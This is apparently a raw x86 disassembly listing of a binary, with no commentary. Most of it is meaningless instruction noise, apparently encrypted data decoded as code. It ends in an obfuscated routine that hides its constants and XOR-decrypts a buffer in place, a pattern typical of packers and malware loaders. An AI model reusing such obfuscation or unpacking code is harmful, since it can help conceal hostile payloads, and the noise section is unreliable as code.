  4058ff:	rol    esp,cl
  405901:	mov    bh,0xe
  405903:	or     BYTE PTR [esi+0x12fb42c0],cl
  405909:	add    al,0x72
  40590b:	or     DWORD PTR [ebp+0x27],ebp
  40590e:	pushf  
  40590f:	jb     0x4058ee
  405911:	mov    ch,0x2
  405913:	enter  0xfb45,0x2b
  405917:	mov    ch,0x3d
  405919:	mov    edi,0xe16c721b
  40591e:	pop    ebp
  40591f:	adc    ebx,ecx
  405921:	jbe    0x4058d5
  405923:	test   al,0x3c
  405925:	jnp    0x4058f4
  405927:	loopne 0x405906
  405929:	mov    ds:0x4da7d54a,al
  40592e:	sbb    al,0xed
  405930:	lods   eax,DWORD PTR ds:[esi]
  405931:	lahf   
  405932:	mov    dl,0x18
  405934:	xor    ch,cl
  405936:	out    dx,eax
  405937:	bound  edi,QWORD PTR [ebp+0x81d25b2]
  40593d:	neg    DWORD PTR [ebx+0x48]
  405940:	hlt    
  405941:	push   edx
  405942:	dec    ebx
  405943:	nop
  405944:	adc    eax,0x97c329a8
  405949:	out    0xe2,al
  40594b:	or     dl,dh
  40594d:	mov    edi,DWORD PTR [ebx+0x72b24125]
  405953:	or     BYTE PTR [eax],bh
  405955:	dec    esi
  405956:	mov    ch,0x25
  405958:	cmp    BYTE PTR [eax],0x36
  40595b:	repz jae 0x405924
  40595e:	mov    gs,WORD PTR [ecx+esi*4+0x7f7b316]
  405965:	sti    
  405966:	xchg   dl,dl
  405968:	aas    
  405969:	in     eax,dx
  40596a:	add    eax,0x4dd6cbe1
  40596f:	(bad)  
  405970:	jmp    0x16c6:0xd99a2aaf
  405977:	add    eax,0xce43784c
  40597c:	jl     0x4059a8
  40597e:	and    al,0x5b
  405980:	mov    fs:0x6901502b,al
  405986:	fidiv  DWORD PTR [eax+0x6d]
  405989:	xlat   BYTE PTR ds:[ebx]
  40598a:	(bad)  
  40598b:	mov    ds:0x52be0150,al
  405990:	mov    ebp,0x4b1e4c15
  405995:	sub    al,0xd7
  405997:	lds    ecx,FWORD PTR ds:0x16ed697d
  40599d:	iret   
  40599e:	inc    edi
  40599f:	shl    DWORD PTR [ebp+0x5d],cl
  4059a2:	lods   eax,DWORD PTR ds:[esi]
  4059a3:	push   ebp
  4059a4:	loope  0x40594d
  4059a6:	(bad)  
  4059a7:	jo     0x405943
  4059a9:	aas    
  4059aa:	stos   BYTE PTR es:[edi],al
  4059ab:	push   esp
  4059ac:	mov    BYTE PTR [ebx-0x1f],al
  4059af:	pop    ebx
  4059b0:	add    ah,ah
  4059b2:	icebp  
  4059b3:	xor    ecx,0xffffffba
  4059b6:	mov    eax,0xf8eacc02
  4059bb:	imul   edx,DWORD PTR ds:[eax+0x5f],0xffffff81
  4059c0:	popf   
  4059c1:	xchg   ebx,eax
  4059c2:	test   BYTE PTR [ecx+0xbeccb96],cl
  4059c8:	jmp    0x405976
  4059ca:	ja     0x4059b7
  4059cc:	mov    esi,0xd37ea74e
  4059d1:	xchg   edi,eax
  4059d2:	dec    edi
  4059d3:	out    0xd0,eax
  4059d5:	add    DWORD PTR [ebx-0x3],eax
  4059d8:	and    dl,dh
  4059da:	push   ss
  4059db:	loopne 0x405a57
  4059dd:	inc    esp
  4059de:	and    al,BYTE PTR [ebx+ebx*8-0x52]
  4059e2:	push   ds
  4059e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059e4:	xlat   BYTE PTR ds:[ebx]
  4059e5:	mov    eax,ds:0x91bd75a1
  4059ea:	xor    BYTE PTR [ecx+eiz*2-0x60747daa],ah
  4059f1:	pop    esi
  4059f2:	jb     0x405a1b
  4059f4:	sub    dh,BYTE PTR [ebx+0x28]
  4059f7:	test   eax,0x4d45411a
  4059fc:	cmp    dh,BYTE PTR [eax-0x22]
  4059ff:	cmc    
  405a00:	dec    edi
  405a01:	ss and esi,ecx
  405a04:	or     al,0xee
  405a06:	(bad)  
  405a07:	jle    0x405a5d
  405a09:	push   edx
  405a0a:	pushf  
  405a0b:	xor    ecx,DWORD PTR [ebp-0x62015d28]
  405a11:	imul   eax,DWORD PTR [ebx+esi*4-0x38e3da19],0xffffff9e
  405a19:	(bad)  
  405a1a:	pop    esi
  405a1b:	jmp    0x2d02:0xacd9eed
  405a22:	pop    ecx
  405a23:	cdq    
  405a24:	into   
  405a25:	fmul   st,st(1)
  405a27:	adc    dh,bh
  405a29:	into   
  405a2a:	mov    dh,0x1b
  405a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a2d:	in     eax,0x76
  405a2f:	and    edi,DWORD PTR gs:[ecx]
  405a32:	mov    dl,0x24
  405a34:	push   es
  405a35:	cmp    DWORD PTR [edx-0x496d6647],0x4e
  405a3c:	jp     0x405a0b
  405a3e:	inc    ecx
  405a3f:	push   cs
  405a40:	dec    eax
  405a41:	ss ss add eax,0xcc6d5188
  405a48:	jecxz  0x405a9f
  405a4a:	xor    ecx,DWORD PTR [eax-0x5e]
  405a4d:	xor    bh,BYTE PTR [esi]
  405a4f:	xor    eax,0x9585da69
  405a54:	cmp    bh,BYTE PTR [eax]
  405a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a57:	adc    ebp,esp
  405a59:	in     al,0x87
  405a5b:	dec    ebx
  405a5c:	fisub  WORD PTR [ecx]
  405a5e:	sub    cl,BYTE PTR [edi+0x588d92b0]
  405a64:	cmp    eax,0x4cbe94ac
  405a69:	retf   
  405a6a:	addr16 mov ecx,0x36e3e90b
  405a70:	pushf  
  405a71:	ficom  WORD PTR [eax+esi*1-0xf9993e2]
  405a78:	mov    edi,0xa8e8974a
  405a7d:	int    0xa7
  405a7f:	daa    
  405a80:	mov    DWORD PTR [ecx+ebx*2-0x57],ebp
  405a84:	add    DWORD PTR [eax+0x6],edx
  405a87:	add    edx,edx
  405a89:	mov    eax,DWORD PTR [eax-0x6f4e686f]
  405a8f:	pop    es
  405a90:	inc    esi
  405a91:	fwait
  405a92:	mov    bh,0xdc
  405a94:	fcom   QWORD PTR [ebp-0x294d1e28]
  405a9a:	adc    BYTE PTR [esi+0x2e],bl
  405a9d:	add    eax,0x2cd7bb7a
  405aa2:	das    
  405aa3:	shr    BYTE PTR [edx-0x20],1
  405aa6:	fild   QWORD PTR [esi-0x2e7d24d7]
  405aac:	leave  
  405aad:	(bad)  
  405aae:	push   ss
  405aaf:	jns    0x405a76
  405ab1:	ins    DWORD PTR es:[edi],dx
  405ab2:	bound  esi,QWORD PTR ds:0x2af704d6
  405ab8:	xor    ch,cl
  405aba:	and    dl,al
  405abc:	pop    ebx
  405abd:	call   0x7427ac63
  405ac2:	adc    esp,edi
  405ac4:	jns    0x405af6
  405ac6:	push   ds
  405ac7:	xor    eax,0x1405004c
  405acc:	mov    esi,0xb40295f5
  405ad1:	pop    ecx
  405ad2:	sbb    eax,0x5850e6dc
  405ad7:	call   0x484b:0x88bb572f
  405ade:	imul   ebx,DWORD PTR [edi+0x700a8964],0xffffff97
  405ae5:	cld    
  405ae6:	dec    esp
  405ae7:	push   edx
  405ae8:	sbb    esi,eax
  405aea:	pusha  
  405aeb:	imul   dh
  405aed:	sub    al,0x99
  405aef:	mov    ah,0x3a
  405af1:	push   0xcb414324
  405af6:	ja     0x405b4a
  405af8:	mov    ebx,0x4c6762e7
  405afd:	xor    ebp,ecx
  405aff:	aad    0xaa
  405b01:	jl     0x405b4f
  405b03:	enter  0x2ef,0x39
  405b07:	cmp    bh,bh
  405b09:	lods   eax,DWORD PTR ds:[esi]
  405b0a:	or     DWORD PTR [ebx],eax
  405b0c:	icebp  
  405b0d:	mov    ch,ah
  405b0f:	cwde   
  405b10:	cmp    DWORD PTR [edx+0x325201f2],edx
  405b16:	push   ss
  405b17:	sbb    edx,DWORD PTR [esi+0x42]
  405b1a:	shl    BYTE PTR [esi-0x3e434808],cl
  405b20:	push   edx
  405b21:	add    ecx,DWORD PTR gs:[eax]
  405b24:	stc    
  405b25:	loop   0x405ab2
  405b27:	and    eax,0xfcb418a1
  405b2c:	sub    al,0xac
  405b2e:	or     al,0x61
  405b30:	add    eax,0x5e84a1c7
  405b35:	shr    bl,0x13
  405b38:	xor    DWORD PTR [eax+0x62],eax
  405b3b:	sbb    dh,dh
  405b3d:	xor    DWORD PTR [edx+ecx*2+0x33],esp
  405b41:	(bad)  
  405b42:	sbb    cl,bl
  405b44:	adc    al,0x13
  405b46:	push   cs
  405b47:	and    DWORD PTR [edi-0x62],esi
  405b4a:	ins    BYTE PTR es:[edi],dx
  405b4b:	sub    al,0xf7
  405b4d:	adc    al,0xcd
  405b4f:	mov    eax,ds:0x550248da
  405b54:	mov    esp,0xb7764603
  405b59:	inc    edi
  405b5a:	adc    BYTE PTR ds:0xc5565583,cl
  405b60:	imul   esp,DWORD PTR [ecx],0xc9c22f80
  405b66:	es inc ecx
  405b68:	or     edi,DWORD PTR [edx-0x35]
  405b6b:	scas   eax,DWORD PTR es:[edi]
  405b6c:	inc    edx
  405b6d:	pop    edi
  405b6e:	loop   0x405b02
  405b70:	popf   
  405b71:	pop    esi
  405b72:	mov    BYTE PTR [esi],dl
  405b74:	adc    ch,0xcd
  405b77:	pusha  
  405b78:	jno    0x405b4b
  405b7a:	xlat   BYTE PTR ds:[ebx]
  405b7b:	(bad)  
  405b7c:	(bad)  
  405b7f:	sub    ebx,DWORD PTR [edi-0x6b]
  405b82:	inc    esp
  405b83:	sub    bh,dl
  405b85:	sbb    ebp,DWORD PTR [edi+0x54873461]
  405b8b:	dec    eax
  405b8c:	jg     0x405bd0
  405b8e:	xlat   BYTE PTR ds:[ebx]
  405b8f:	mov    ebp,0x71497dea
  405b94:	out    dx,al
  405b95:	sub    eax,0xe7856bca
  405b9a:	inc    ebx
  405b9b:	mov    dl,0x4d
  405b9d:	ret    0x8f21
  405ba0:	lds    eax,FWORD PTR [edi]
  405ba2:	dec    edi
  405ba3:	popf   
  405ba4:	(bad)  
  405ba5:	dec    edi
  405ba7:	push   ds
  405ba8:	les    ecx,FWORD PTR [ebx-0x7e]
  405bab:	jp     0x405b46
  405bad:	dec    edx
  405bae:	xchg   ebx,eax
  405baf:	sub    DWORD PTR [ecx+0x6a],ebp
  405bb2:	push   esp
  405bb3:	adc    bh,dh
  405bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bb6:	ds dec ecx
  405bb8:	addr16 cmp eax,0xa6b869ed
  405bbe:	jns    0x405b72
  405bc0:	cs or  edx,esp
  405bc3:	lahf   
  405bc4:	sti    
  405bc5:	xchg   esp,eax
  405bc6:	rcr    al,0x7b
  405bc9:	inc    ebx
  405bca:	shl    DWORD PTR [edi],1
  405bcc:	iret   
  405bcd:	inc    esi
  405bce:	jo     0x405b7b
  405bd0:	sub    bh,BYTE PTR [edx]
  405bd2:	pop    esi
  405bd3:	rol    BYTE PTR [ebx+0x45],0x20
  405bd7:	cmp    esp,esp
  405bd9:	cld    
  405bda:	in     al,0xa7
  405bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bdd:	xchg   edx,eax
  405bde:	add    edi,edx
  405be0:	jl     0x405b65
  405be2:	hlt    
  405be3:	retf   0x36c6
  405be6:	popf   
  405be7:	cmp    eax,0xecd3235b
  405bec:	adc    cl,BYTE PTR [ecx+0x30cbce3c]
  405bf2:	loopne 0x405c4f
  405bf4:	jbe    0x405bf1
  405bf6:	addr16 mov esp,0x3ced44ae
  405bfc:	fucomip st,st(5)
  405bfe:	rol    ecx,0x71
  405c01:	iret   
  405c02:	add    al,0x12
  405c04:	das    
  405c05:	push   edi
  405c06:	retf   0x45
  405c09:	pushf  
  405c0a:	pop    ecx
  405c0b:	push   ecx
  405c0c:	mov    fs,eax
  405c0e:	shr    BYTE PTR [esi-0x28],cl
  405c11:	sbb    eax,0xa8969972
  405c16:	fisubr WORD PTR ds:0x3ff4d58f
  405c1c:	xor    BYTE PTR [edx-0x6075a12],dh
  405c22:	push   edx
  405c23:	(bad)  
  405c25:	jecxz  0x405c13
  405c27:	and    DWORD PTR [eax],ecx
  405c29:	outs   dx,DWORD PTR ds:[esi]
  405c2a:	add    eax,0x3f47736c
  405c2f:	cmp    cl,BYTE PTR [ecx]
  405c31:	ja     0x405c3b
  405c33:	ss inc ebx
  405c35:	test   al,0x7c
  405c37:	repz repnz fild WORD PTR [esi+0x33024311]
  405c3f:	adc    eax,0x4320c743
  405c44:	(bad)  
  405c46:	(bad)  
  405c48:	sbb    eax,0x1a7bacf
  405c4d:	xlat   BYTE PTR ds:[ebx]
  405c4e:	adc    cx,di
  405c51:	pop    esi
  405c52:	popa   
  405c53:	sti    
  405c54:	into   
  405c55:	je     0x405c26
  405c57:	xchg   esp,eax
  405c58:	push   edi
  405c59:	outs   dx,DWORD PTR ds:[esi]
  405c5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c5b:	test   eax,0xd1ab959b
  405c60:	pop    ss
  405c61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c62:	out    dx,eax
  405c63:	out    0xf3,al
  405c65:	pop    esp
  405c66:	iret   
  405c67:	(bad)  
  405c68:	mov    bh,0xb6
  405c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c6b:	push   0xffffffee
  405c6d:	pop    es
  405c6e:	scas   al,BYTE PTR es:[edi]
  405c6f:	push   eax
  405c70:	das    
  405c71:	cdq    
  405c72:	add    eax,DWORD PTR [eax-0x526959e4]
  405c78:	stos   BYTE PTR es:[edi],al
  405c79:	pop    ss
  405c7a:	and    eax,0xa0ae43fa
  405c7f:	mov    WORD PTR [edx-0x7f1e6083],cs
  405c85:	sub    edx,DWORD PTR [ebx-0xa3f0507]
  405c8b:	xchg   esp,eax
  405c8c:	sbb    edi,DWORD PTR [ebp-0x79]
  405c8f:	adc    dl,BYTE PTR [ecx+0x23]
  405c92:	jae    0x405cb1
  405c94:	stos   BYTE PTR es:[edi],al
  405c95:	call   0x31535736
  405c9a:	cmp    ch,BYTE PTR [edx]
  405c9c:	imul   eax,DWORD PTR [eax-0x39],0x40
  405ca0:	popf   
  405ca1:	retf   
  405ca2:	adc    bh,BYTE PTR [ebp+0x15694d8a]
  405ca8:	xchg   esp,eax
  405ca9:	inc    esp
  405caa:	data16 jp 0x405ce3
  405cad:	ret    
  405cae:	xor    BYTE PTR [edx],al
  405cb0:	sub    DWORD PTR [ebx+0x66],ecx
  405cb3:	(bad)  
  405cb4:	xchg   esi,eax
  405cb5:	cmp    eax,0xc3b5aaa2
  405cba:	mov    ds,WORD PTR [ebp-0x6b]
  405cbd:	xchg   esp,eax
  405cbe:	jp     0x405cec
  405cc0:	pop    ss
  405cc1:	pop    esp
  405cc2:	sbb    bh,BYTE PTR [ecx+0x49610b31]
  405cc8:	mov    eax,ds:0x4079f33a
  405ccd:	in     al,0x64
  405ccf:	mov    ds:0x27710a7c,eax
  405cd4:	icebp  
  405cd5:	popf   
  405cd6:	mov    edi,0x413f820
  405cdb:	test   BYTE PTR [ecx-0x53f6b01f],bh
  405ce1:	jp     0x405cad
  405ce3:	jnp    0x405d63
  405ce5:	and    al,0xd4
  405ce7:	fisub  DWORD PTR [esi-0x42bc5ac6]
  405ced:	xchg   ebp,eax
  405cee:	scas   al,BYTE PTR es:[edi]
  405cef:	cmp    ebp,DWORD PTR [ecx+0x9]
  405cf2:	jo     0x405ca6
  405cf4:	inc    ecx
  405cf5:	dec    edi
  405cf6:	mov    ch,BYTE PTR [edi+0x7a2ed4f7]
  405cfc:	cmp    eax,0x91b6f0ec
  405d01:	pop    edx
  405d02:	aam    0xed
  405d04:	icebp  
  405d05:	mov    edi,0xc7ee9e23
  405d0a:	addr16 enter 0xde6f,0xc4
  405d0f:	fwait
  405d10:	outs   dx,DWORD PTR ds:[esi]
  405d11:	xchg   edx,eax
  405d12:	mov    esi,0xab71e8c1
  405d17:	xor    ecx,DWORD PTR [ebx*1+0x5524372f]
  405d1e:	push   esi
  405d1f:	jae    0x405d38
  405d21:	sahf   
  405d22:	or     dl,BYTE PTR cs:[eax+ebx*4-0x79f4eab]
  405d2a:	inc    esi
  405d2b:	adc    BYTE PTR [edi-0x2a],bl
  405d2e:	pop    ss
  405d2f:	xchg   edi,eax
  405d30:	push   ds
  405d31:	jmp    0xecb1045a
  405d36:	dec    eax
  405d37:	mov    gs,esp
  405d39:	ret    
  405d3a:	mov    ebp,0x58b42bbc
  405d3f:	lds    edx,FWORD PTR [esi+esi*2]
  405d42:	leave  
  405d43:	xchg   ebx,eax
  405d44:	adc    esi,edi
  405d46:	call   0xfd60:0x6358c49b
  405d4d:	std    
  405d4e:	test   BYTE PTR [esp+eax*8],dh
  405d51:	add    ch,al
  405d53:	iret   
  405d54:	out    0x65,eax
  405d56:	add    cl,cl
  405d58:	lock lods al,BYTE PTR ds:[esi]
  405d5a:	fidiv  WORD PTR [edx+0x1]
  405d5d:	push   cs
  405d5e:	adc    bl,BYTE PTR [eax+0x7f]
  405d61:	mov    ds:0xd10da885,eax
  405d66:	(bad)  
  405d67:	out    dx,al
  405d68:	inc    esi
  405d69:	aas    
  405d6a:	ins    BYTE PTR es:[edi],dx
  405d6b:	ins    DWORD PTR es:[edi],dx
  405d6c:	add    eax,0xbd6c2dd3
  405d71:	cmp    DWORD PTR [ebx*8+0x5e6119e1],0x9
  405d79:	inc    esp
  405d7a:	or     al,0x77
  405d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d7d:	hlt    
  405d7e:	(bad)
  405d82:	imul   edi,eax,0x12
  405d85:	stos   BYTE PTR es:[edi],al
  405d86:	pop    esi
  405d87:	xor    al,0x4d
  405d89:	aaa    
  405d8a:	je     0x405db6
  405d8c:	lods   al,BYTE PTR ds:[esi]
  405d8d:	pop    esi
  405d8e:	and    esi,DWORD PTR [edi]
  405d90:	lods   al,BYTE PTR ds:[esi]
  405d91:	fcmovb st,st(7)
  405d93:	mov    ds:0x4fb19158,al
  405d98:	pop    esi
  405d99:	ret    0xc86d
  405d9c:	lock dec eax
  405d9e:	xor    al,0x77
  405da0:	sub    al,0x78
  405da2:	clc    
  405da3:	xor    DWORD PTR [esi-0x53571eff],eax
  405da9:	je     0x405da1
  405dab:	mov    ?,ecx
  405dad:	jle    0x405e04
  405daf:	in     al,0x83
  405db1:	jle    0x405d44
  405db3:	pusha  
  405db4:	add    eax,0xdc98cf6b
  405db9:	sbb    eax,0x6430a4b0
  405dbe:	stc    
  405dbf:	xor    ebx,esi
  405dc1:	pop    es
  405dc2:	xchg   ecx,eax
  405dc3:	loop   0x405dd9
  405dc5:	jp     0x405e04
  405dc7:	xor    BYTE PTR [edi+0x3c],0x15
  405dcb:	pusha  
  405dcc:	mov    ebx,0xf643e588
  405dd1:	out    0xbe,eax
  405dd3:	mov    WORD PTR [esp+eax*8-0x8],fs
  405dd7:	pop    ss
  405dd8:	(bad)  
  405dd9:	mov    ebp,0x40e920d6
  405dde:	xor    eax,0xa97f5a4a
  405de3:	sahf   
  405de4:	mov    ebp,0xa50cc409
  405de9:	sahf   
  405dea:	mov    bh,0xe1
  405dec:	cmp    BYTE PTR [ecx+0x12d7e43d],ch
  405df2:	jo     0x405dbb
  405df4:	mov    cl,0xa3
  405df6:	gs jnp 0x405e36
  405df9:	pop    ds
  405dfa:	leave  
  405dfb:	(bad)  
  405dfc:	imul   ebx,DWORD PTR cs:[edx-0x185dd2a6],0xffffffc3
  405e04:	push   ebx
  405e05:	aad    0x12
  405e07:	jae    0x405deb
  405e09:	push   esi
  405e0a:	cmp    DWORD PTR ds:0x6dc45398,ebp
  405e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e11:	xchg   BYTE PTR [ebp+0x48],dh
  405e14:	jl     0x405e70
  405e16:	sub    BYTE PTR [edi+0x38f41f75],cl
  405e1c:	addr16 inc esi
  405e1e:	jp     0x405e44
  405e20:	in     eax,0x62
  405e22:	pop    ecx
  405e23:	gs retf 
  405e25:	imul   cl
  405e27:	stos   BYTE PTR es:[edi],al
  405e28:	dec    ebp
  405e29:	(bad)  
  405e2a:	sub    eax,0x6046fe55
  405e2f:	adc    bh,BYTE PTR [edi]
  405e31:	cmp    BYTE PTR [ebx],0xd1
  405e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e35:	jno    0x405dd1
  405e37:	scas   al,BYTE PTR es:[edi]
  405e38:	jmp    0x405e37
  405e3a:	frstor [ebx]
  405e3c:	sbb    eax,0x241f877c
  405e41:	cdq    
  405e42:	in     eax,dx
  405e43:	mov    eax,0x5f3b52b0
  405e48:	aad    0xb6
  405e4a:	push   0x8b756eb7
  405e4f:	cmp    al,bl
  405e51:	nop
  405e52:	sub    bl,dh
  405e54:	push   ss
  405e55:	imul   edi,DWORD PTR [edx-0x50099ef2],0xffffffe6
  405e5c:	sub    bh,dh
  405e5e:	imul   ebp,DWORD PTR [eax-0x7d],0x1f
  405e62:	push   ecx
  405e63:	mov    al,0xe4
  405e65:	sbb    DWORD PTR [eax],0xadd08633
  405e6b:	cs push eax
  405e6d:	(bad)  
  405e6f:	ds push 0x79dcd04e
  405e75:	push   esi
  405e76:	es out 0xf3,eax
  405e79:	add    al,dl
  405e7b:	dec    edi
  405e7c:	mov    ds:0x248434ba,al
  405e81:	sbb    ah,BYTE PTR [esi-0x28]
  405e84:	(bad)  
  405e85:	push   ecx
  405e86:	cmp    cl,bh
  405e88:	fnsave [esi+eax*8+0x1a]
  405e8c:	mov    bl,0x7c
  405e8e:	or     eax,0x4e0e12cd
  405e93:	sub    DWORD PTR ds:0x7130166a,ebp
  405e99:	ror    BYTE PTR ds:0x4b2afd47,cl
  405e9f:	iret   
  405ea0:	push   esi
  405ea1:	jne    0x405eb9
  405ea3:	dec    ebx
  405ea4:	pusha  
  405ea5:	aam    0xda
  405ea7:	and    eax,0x34b6d212
  405eac:	mov    cl,0x84
  405eae:	add    edi,edi
  405eb0:	rol    ah,cl
  405eb2:	stos   DWORD PTR es:[edi],eax
  405eb3:	pop    ebp
  405eb4:	std    
  405eb5:	cmp    eax,DWORD PTR [bx]
  405eb8:	out    0x77,eax
  405eba:	jmp    0x1ba94d0d
  405ebf:	cmp    eax,0x6805100f
  405ec4:	mov    cl,0xdf
  405ec6:	mov    eax,ds:0x6f2b929d
  405ecb:	sbb    BYTE PTR [edx],cl
  405ecd:	pop    ebx
  405ece:	call   0x1673b995
  405ed3:	mov    ds:0x9bb6eafc,eax
  405ed8:	out    dx,eax
  405ed9:	jecxz  0x405e8f
  405edb:	push   edi
  405edc:	cdq    
  405edd:	in     eax,dx
  405ede:	mov    dh,BYTE PTR [eax]
  405ee0:	inc    edi
  405ee1:	dec    eax
  405ee2:	inc    ebp
  405ee3:	push   0xffffffe8
  405ee5:	adc    DWORD PTR [eax-0x5c53ac32],edi
  405eeb:	les    ecx,FWORD PTR [eax-0x5f]
  405eee:	jbe    0x405e89
  405ef0:	rol    DWORD PTR [edx-0x12],1
  405ef3:	or     dl,BYTE PTR [ebp+0x23f95991]
  405ef9:	xchg   ebp,eax
  405efa:	sub    bh,al
  405efc:	cwde   
  405efd:	clc    
  405efe:	mov    al,0xa0
  405f00:	addr16 inc edx
  405f02:	and    al,0x9b
  405f04:	jmp    0x3e49bb97
  405f09:	adc    al,cl
  405f0b:	retf   
  405f0c:	fmul   QWORD PTR [esi-0x10]
  405f0f:	(bad)  
  405f10:	test   eax,0x52f726bf
  405f15:	jmp    0x405eb7
  405f17:	xor    cl,dh
  405f19:	xchg   ecx,eax
  405f1a:	cdq    
  405f1b:	not    DWORD PTR [edx]
  405f1d:	bound  ecx,QWORD PTR [esi-0x70]
  405f20:	mov    ch,0xf5
  405f22:	pop    es
  405f23:	mov    ds:0xd191013f,eax
  405f28:	mov    dh,BYTE PTR [edi+0x7f88d855]
  405f2e:	rcl    BYTE PTR [ebx+0x51],0x4b
  405f32:	shl    DWORD PTR [eax+0x3d],cl
  405f35:	and    BYTE PTR [esi+0x3c560cc3],bl
  405f3b:	sub    al,0xe6
  405f3d:	add    BYTE PTR [esi-0xff3b3ba],bl
  405f43:	xchg   esp,eax
  405f44:	xor    ebx,DWORD PTR [edx+ebp*2]
  405f47:	mov    DWORD PTR [ebp-0x2c],eax
  405f4a:	mov    eax,DWORD PTR [ebp-0x58]
  405f4d:	sub    eax,ecx
  405f4f:	mov    DWORD PTR [ebp-0x1c],eax
  405f52:	mov    eax,DWORD PTR [ebp-0x1c]
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
